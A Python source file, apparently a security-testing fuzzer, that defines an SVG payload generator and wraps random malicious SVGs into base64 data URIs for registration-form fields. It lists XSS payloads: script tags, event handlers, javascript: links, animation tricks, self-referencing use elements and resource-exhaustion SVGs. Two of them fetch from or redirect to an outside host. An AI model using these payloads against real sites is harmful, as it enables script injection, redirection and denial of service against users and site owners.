from typing import Dict, List
import random
import base64

class SVGGenerator:
    def __init__(self):
        self._init_svg_attacks()

    def _init_svg_attacks(self):
        """Inicializa diferentes tipos de SVG maliciosos"""
        self.script_injection = [
            """<svg><script>alert('XSS')</script></svg>""",
            """<svg><script>fetch('http://kappapride.com')</script></svg>""",
            """<svg><script>eval(atob('base64_encoded_payload'))</script></svg>""",
            """<svg><script>document.location='http://kappapride.com'</script></svg>""",
            """<svg><script>window.open('javascript:alert(1)')</script></svg>"""
        ]
        
        self.event_handlers = [
            """<svg onload="alert(1)"/>""",
            """<svg onunload="alert(1)"/>""",
            """<svg onabort="alert(1)"/>""",
            """<svg onerror="alert(1)"/>""",
            """<svg onresize="alert(1)"/>"""
        ]
        
        self.embedded_images = [
            """<svg><image href="javascript:alert(1)"/></svg>""",
            """<svg><image href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"/></svg>""",
            """<svg><image href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="/></svg>""",
            """<svg><image href="data:application/x-javascript;base64,YWxlcnQoMSk="/></svg>""",
            """<svg><image href="data:text/xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"/></svg>"""
        ]
        
        self.animation_attacks = [
            """<svg><animate attributeName="onload" values="alert(1)"/></svg>""",
            """<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>""",
            """<svg><animate attributeName="xlink:href" values="javascript:alert(1)"/></svg>""",
            """<svg><set attributeName="onload" to="alert(1)"/></svg>""",
            """<svg><animate attributeName="onmouseover" values="alert(1)"/></svg>"""
        ]
        
        self.recursive_patterns = [
            """<svg><use href="#x" /><g id="x"><use href="#x" /></g></svg>""",
            """<svg><pattern id="p" width="100" height="100"><use href="#p"/></pattern></svg>""",
            """<svg><defs><g id="g"><g><use href="#g"/></g></g></defs></svg>""",
            """<svg><mask id="m"><use href="#m"/></mask></svg>""",
            """<svg><symbol id="s"><use href="#s"/></symbol></svg>"""
        ]

    def generate_attack(self) -> Dict[str, str]:
        """Gera um ataque SVG aleatório"""
        all_attacks = (
            self.script_injection +
            self.event_handlers +
            self.embedded_images +
            self.animation_attacks +
            self.recursive_patterns
        )
        
        svg = random.choice(all_attacks)
        encoded_svg = base64.b64encode(svg.encode()).decode()
        
        return {
            'username': f'<img src="data:image/svg+xml;base64,{encoded_svg}">',
            'email': f'svg.test@test.com',
            'password': 'SVGtest123!',
            'profile_image': f'data:image/svg+xml;base64,{encoded_svg}'
        }

    def generate_resource_heavy(self) -> Dict[str, str]:
        """Gera SVGs que consomem muitos recursos"""
        heavy_patterns = [
            # Padrão que cresce infinitamente
            """<svg width="100%" height="100%" onload="this.width.baseVal.value+=10;this.height.baseVal.value+=10;">
                <rect width="100%" height="100%" fill="red"/>
            </svg>""",
            
            # Animação infinita com muitos elementos
            """<svg width="500" height="500">
                <script>
                    for(let i=0; i<1000; i++) {
                        document.getElementsByTagName('svg')[0].innerHTML += '<rect width="10" height="10" x="'+i+'" y="'+i+'">';
                    }
                </script>
            </svg>""",
            
            # Recursão profunda
            """<svg>
                <defs>
                    <pattern id="p" width="10" height="10" patternUnits="userSpaceOnUse">
                        <use href="#p" transform="scale(0.9)"/>
                    </pattern>
                </defs>
                <rect width="100%" height="100%" fill="url(#p)"/>
            </svg>"""
        ]
        
        svg = random.choice(heavy_patterns)
        encoded_svg = base64.b64encode(svg.encode()).decode()
        
        return {
            'username': f'<img src="data:image/svg+xml;base64,{encoded_svg}">',
            'profile_image': f'data:image/svg+xml;base64,{encoded_svg}'
        }

    def generate_malformed_svg(self) -> Dict[str, str]:
        """Gera SVGs mal formados"""
        malformed_patterns = [
            """<svg><unclosed_tag>""",
            """<svg><invalid attribute=></svg>""",
            """<svg></>""",
            """<svg><script>malformed javascript</script></svg>""",
            """<svg><![CDATA[unclosed cdata"""
        ]
        
        svg = random.choice(malformed_patterns)
        encoded_svg = base64.b64encode(svg.encode()).decode()
        
        return {
            'username': f'<img src="data:image/svg+xml;base64,{encoded_svg}">',
            'profile_image': f'data:image/svg+xml;base64,{encoded_svg}'
        }